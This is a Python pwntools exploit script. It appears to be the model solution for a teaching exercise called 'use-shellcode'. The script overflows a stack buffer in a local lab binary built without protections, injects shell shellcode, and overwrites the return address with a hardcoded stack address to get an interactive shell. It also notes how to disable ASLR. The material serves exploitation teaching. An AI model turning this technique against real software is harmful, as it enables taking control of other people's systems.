"""
Solution (exploit) for use-shellcode task.

Use pwntools (https://docs.pwntools.com/en/stable/) to inject a shellcode and
overwrite the return address of reader() to jump to the shellcode.

The executable is compiled using -zexecstack, doesn't use canary and assumes
ASLR is disabled. To run an ASLR disabled shell, do:
   setarch $(uname -m) -R /bin/bash
"""

from pwn import *


# offset to return address
offset = 0x40+4

# Obtain the machine code shellcode.
context.arch = 'i386'
context.os = 'linux'
shellcode = asm(shellcraft.sh())

# Start process.
io = process("./vuln")

# Compute possible address of buffer.
address = 0xffffcfc8 - 0x48 # from dmesg

# Craft payload.
payload = shellcode + (offset - len(shellcode)) * b'a' + p32(address)
open('payload', 'wb').write(payload)

msg = io.recvline()
io.sendline(payload)
# Read hello message.
msg = io.recvline()
# See if a shell is active.
msg = io.recv(timeout=1)
msg = io.recv(timeout=1)

# Yield control to user.
io.interactive()
